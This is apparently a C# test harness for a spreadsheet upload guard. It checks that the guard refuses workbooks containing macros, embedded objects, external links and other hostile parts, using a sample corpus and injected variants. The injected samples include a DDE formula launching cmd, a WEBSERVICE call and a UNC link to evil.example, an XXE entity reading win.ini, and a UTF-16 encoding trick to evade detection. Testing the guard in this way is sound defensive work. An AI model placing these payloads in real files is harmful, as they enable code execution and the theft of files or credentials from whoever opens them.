using System.IO.Compression;
using System.Text;
using TatvaOS.Api.Modules.Docs;

namespace TatvaOS.Tests.SheetsXlsxGuard;

/// <summary>
/// XlsxGuard (apps/api/Modules/Docs/XlsxGuard.cs) against workbooks made by
/// other people — Mr. Singh's condition on PR 342, 1 October 2026.
///
/// corpus/manifest.tsv names every file, what must happen to it, and WHY —
/// and the "why" was read from the file by a separate program in another
/// language (a real XML parser, no code shared with the guard), not taken
/// from the guard's own answer. Three labels:
///
///   refuse   it holds something that attacks whoever opens it
///   permit   a plain workbook: nothing in it reaches out or runs
///   strict   plain by Excel's standards, but the guard refuses it anyway,
///            for a printer-settings part (.bin) or a web link stored as a
///            relationship. Harmless here: only Sheets' own writer's files
///            reach the guard, and it writes neither. Listed so that the
///            day Sheets learns to write either, this goes red and is read.
///
/// And the twins the corpus cannot give: workbooks written by Sheets' OWN
/// writer (OURS=folder, from make-ours.ts) must all be permitted; and each
/// of those, with ONE hostile thing added, must be refused.
///
/// Usage:   node --import ./tests/sheets/register.mjs tests/sheets-xlsx-guard/make-ours.ts .tmp/ours
///          OURS=.tmp/ours dotnet run --project tests/sheets-xlsx-guard -c Release
///          CONTROL=permit-all | refuse-all   calibration: a guard that does nothing
/// Exit:    0 all passed, 1 otherwise.
/// </summary>
internal static class Program
{
    private static int passed, failed;
    private static readonly string Control = Environment.GetEnvironmentVariable("CONTROL") ?? "";

    private static void Ok(string what, bool ok, string detail = "")
    {
        if (ok) { passed++; Console.WriteLine($"    ok  {what}"); }
        else { failed++; Console.WriteLine($"  FAIL  {what}{(detail.Length > 0 ? "\n          " + detail : "")}"); }
    }

    private static string? Check(byte[] bytes) => Control switch
    {
        "permit-all" => null,
        "refuse-all" => "refused_everything",
        _ => XlsxGuard.Check(bytes),
    };

    /// <summary>The workbook with one part added or replaced.</summary>
    private static byte[] With(byte[] xlsx, string part, Func<string?, string> content, Encoding? encoding = null)
    {
        var parts = new List<(string Name, byte[] Data)>();
        using (var zin = new ZipArchive(new MemoryStream(xlsx), ZipArchiveMode.Read))
            foreach (var e in zin.Entries)
            {
                using var s = e.Open();
                using var ms = new MemoryStream();
                s.CopyTo(ms);
                parts.Add((e.FullName, ms.ToArray()));
            }
        var at = parts.FindIndex(p => p.Name == part);
        var text = content(at < 0 ? null : Encoding.UTF8.GetString(parts[at].Data));
        // In another encoding, with its byte-order mark: Excel reads it; a
        // guard that reads every part as UTF-8 sees noise and finds nothing.
        var now = encoding is null ? Encoding.UTF8.GetBytes(text)
            : [.. encoding.GetPreamble(), .. encoding.GetBytes(text.Replace("UTF-8", encoding.WebName, StringComparison.OrdinalIgnoreCase))];
        if (at < 0) parts.Add((part, now)); else parts[at] = (part, now);

        var o = new MemoryStream();
        using (var zout = new ZipArchive(o, ZipArchiveMode.Create, leaveOpen: true))
            foreach (var (name, data) in parts)
            {
                using var s = zout.CreateEntry(name).Open();
                s.Write(data);
            }
        return o.ToArray();
    }

    private static int Main()
    {
        Console.OutputEncoding = Encoding.UTF8;
        Console.WriteLine();
        Console.WriteLine("  Sheets: the workbook guard, against workbooks we did not make");
        Console.WriteLine("  =============================================================");
        if (Control.Length > 0) Console.WriteLine($"\n  CONTROL={Control}: the real guard is NOT being run. Failures are the point.");

        var corpus = Path.Combine(AppContext.BaseDirectory, "corpus");
        var rows = File.ReadAllLines(Path.Combine(corpus, "manifest.tsv"))
            .Where(l => l.Trim().Length > 0).Select(l => l.Split('\t')).ToArray();

        foreach (var label in new[] { "refuse", "permit", "strict" })
        {
            var mine = rows.Where(r => r[1] == label).ToArray();
            Console.WriteLine(label switch
            {
                "refuse" => $"\n  Hostile workbooks ({mine.Length}) — every one refused",
                "permit" => $"\n  Plain workbooks ({mine.Length}) — every one permitted",
                _ => $"\n  Plain, but refused for being stricter than Excel ({mine.Length})",
            });
            foreach (var r in mine)
            {
                var bytes = File.ReadAllBytes(Path.Combine(corpus, r[0] + ".sample"));
                var said = Check(bytes);
                if (label == "permit") Ok($"permitted: {r[0]}", said is null, $"refused: {said}   ({r[2]})");
                else Ok($"refused:   {r[0]}  [{said}]  — {r[2]}", said is not null, $"PERMITTED   ({r[2]})");
            }
        }
        Ok($"the corpus is there ({rows.Length} workbooks: {rows.Count(r => r[1] == "refuse")} hostile, {rows.Count(r => r[1] != "refuse")} plain)",
            rows.Count(r => r[1] == "refuse") >= 20 && rows.Count(r => r[1] == "permit") >= 10);

        // ---- our own writer's workbooks ------------------------------------------
        var ours = Environment.GetEnvironmentVariable("OURS");
        var files = ours is { Length: > 0 } && Directory.Exists(ours)
            ? Directory.GetFiles(ours, "ours--*.xlsx").Order().ToArray() : [];
        Console.WriteLine($"\n  Workbooks written by Sheets itself ({files.Length})");
        Ok("they are there (set OURS to the folder make-ours.ts wrote)", files.Length >= 5);

        // One hostile thing at a time, added to a workbook that is otherwise
        // ours and permitted. What each does to the person who opens it:
        (string What, string Part, Func<string?, string> Content)[] additions =
        [
            ("a macro project", "xl/vbaProject.bin", _ => "not really a macro, but named as one"),
            ("a dialog sheet", "xl/dialogsheets/sheet1.xml", _ => "<dialogsheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"/>"),
            ("an Excel 4 macro sheet", "xl/macrosheets/sheet1.xml", _ => "<xm:macrosheet xmlns:xm=\"http://schemas.microsoft.com/office/excel/2006/main\"/>"),
            ("an embedded object", "xl/embeddings/oleObject1.bin", _ => "x"),
            ("an ActiveX control", "xl/activeX/activeX1.xml", _ => "<ax:ocx xmlns:ax=\"http://schemas.microsoft.com/office/2006/activeX\"/>"),
            ("a link to another workbook", "xl/externalLinks/externalLink1.xml", _ => "<externalLink xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"/>"),
            ("a data connection", "xl/connections.xml", _ => "<connections xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"/>"),
            ("a relationship to a file share", "xl/worksheets/_rels/sheet1.xml.rels",
                _ => "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"r1\" Type=\"x\" Target=\"file://server/share/x\" TargetMode=\"External\"/></Relationships>"),
            ("a DOCTYPE", "xl/styles.xml", was => "<!DOCTYPE x [<!ENTITY e SYSTEM \"file:///c:/windows/win.ini\">]>" + was),
            ("a DDE formula", "xl/worksheets/sheet1.xml", was => was!.Replace("<sheetData>", "<sheetData><row r=\"900\"><c r=\"A900\"><f>cmd|' /c calc'!A0</f></c></row>")),
            ("a formula that fetches from the web", "xl/worksheets/sheet1.xml", was => was!.Replace("<sheetData>", "<sheetData><row r=\"900\"><c r=\"A900\"><f>WEBSERVICE(\"https://evil.example\")</f></c></row>")),
            ("a link to a file share", "xl/worksheets/sheet1.xml", was => was!.Replace("<sheetData>", "<sheetData><row r=\"900\"><c r=\"A900\"><f>HYPERLINK(\"\\\\evil.example\\share\",\"Open\")</f></c></row>")),
            ("a reference into another workbook", "xl/worksheets/sheet1.xml", was => was!.Replace("<sheetData>", "<sheetData><row r=\"900\"><c r=\"A900\"><f>[1]Sheet1!A1</f></c></row>")),
        ];

        foreach (var file in files)
        {
            var bytes = File.ReadAllBytes(file);
            var said = Check(bytes);
            Ok($"permitted: {Path.GetFileName(file)}", said is null, $"refused: {said}");

            var missed = new List<string>();
            var unchanged = new List<string>();
            foreach (var (what, part, content) in additions)
            {
                var changed = With(bytes, part, content);
                // The addition has to have happened, or "refused" would be
                // about nothing (a Replace that found no <sheetData>).
                using (var z = new ZipArchive(new MemoryStream(changed), ZipArchiveMode.Read))
                using (var r = new StreamReader(z.GetEntry(part)!.Open()))
                {
                    var now = r.ReadToEnd();
                    var added = part == "xl/worksheets/sheet1.xml" ? now.Contains("A900")
                        : part == "xl/styles.xml" ? now.StartsWith("<!DOCTYPE")
                        : now.Length > 0;
                    if (!added) unchanged.Add(what);
                }
                if (Check(changed) is null) missed.Add(what);
            }
            // The same DDE formula, in a sheet saved as UTF-16.
            foreach (var enc in new Encoding[] { Encoding.Unicode, Encoding.BigEndianUnicode })
            {
                var utf16 = With(bytes, "xl/worksheets/sheet1.xml",
                    was => was!.Replace("<sheetData>", "<sheetData><row r=\"900\"><c r=\"A900\"><f>cmd|' /c calc'!A0</f></c></row>"), enc);
                if (Check(utf16) is null) missed.Add($"a DDE formula in a sheet saved as {enc.WebName}");
            }
            Ok($"           …and refused with any ONE of {additions.Length + 2} hostile things added", missed.Count == 0 && unchanged.Count == 0,
                (missed.Count > 0 ? "PERMITTED with: " + string.Join("; ", missed) : "")
                + (unchanged.Count > 0 ? "   never added: " + string.Join("; ", unchanged) : ""));
        }

        Console.WriteLine();
        Console.WriteLine($"  {passed} passed, {failed} failed");
        return failed == 0 ? 0 : 1;
    }
}
